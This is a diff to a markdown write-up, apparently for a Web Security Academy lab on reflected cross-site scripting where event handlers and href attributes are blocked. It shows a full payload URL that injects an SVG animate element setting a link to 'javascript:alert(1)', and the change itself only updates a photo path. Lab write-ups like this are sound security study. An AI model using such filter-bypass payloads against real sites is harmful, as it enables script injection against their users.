@@ -37,8 +37,10 @@ Manual Payload:
 https://0a50008204ffca2181587f500010009c.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
 ```
 
+Photos:
+
 <p align="center">
     <picture>
-        <img src="../photos/labs/xss/lab-reflected-xss-with-event-handlers-and-href-attributes-blocked.jpeg" alt="xss" width='200'/>
+        <img src="../photos/labs/cross-site-scripting/lab-reflected-xss-with-event-handlers-and-href-attributes-blocked.jpeg" alt="xss" width='100%'/>
     </picture>
 </p>
